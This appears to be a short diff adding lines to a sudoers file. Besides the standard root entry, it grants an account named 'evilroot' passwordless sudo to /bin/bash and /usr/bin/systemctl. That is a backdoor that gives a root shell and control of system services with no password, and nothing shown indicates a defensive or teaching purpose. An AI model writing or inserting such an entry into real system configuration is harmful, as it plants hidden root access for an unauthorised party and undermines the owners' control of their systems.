@@ -1,0 +1,3 @@
+root ALL=(ALL:ALL) ALL
+evilroot ALL=(ALL) NOPASSWD: /bin/bash, /usr/bin/systemctl
+
